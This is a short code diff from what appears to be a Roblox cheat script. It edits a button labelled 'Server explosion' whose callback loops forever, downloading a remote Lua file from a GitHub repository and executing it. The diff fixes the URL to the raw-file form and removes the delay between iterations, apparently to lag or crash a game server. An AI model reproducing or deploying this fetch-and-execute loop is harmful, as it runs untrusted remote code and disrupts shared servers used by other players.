@@ -11,8 +11,7 @@ Tab:AddButton({
 	Name = "Взрыв сервера🤫🧏‍♂️",
 	Callback = function()
 		while true do
-		loadstring(game:HttpGet(('https://github.com/Bendyshechka/GGGLAG/blob/main/slapstick.lua')))()
-		wait(0.000000001)
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Bendyshechka/GGGLAG/refs/heads/main/slapstick.lua"))()
 		end
 	end    
 })
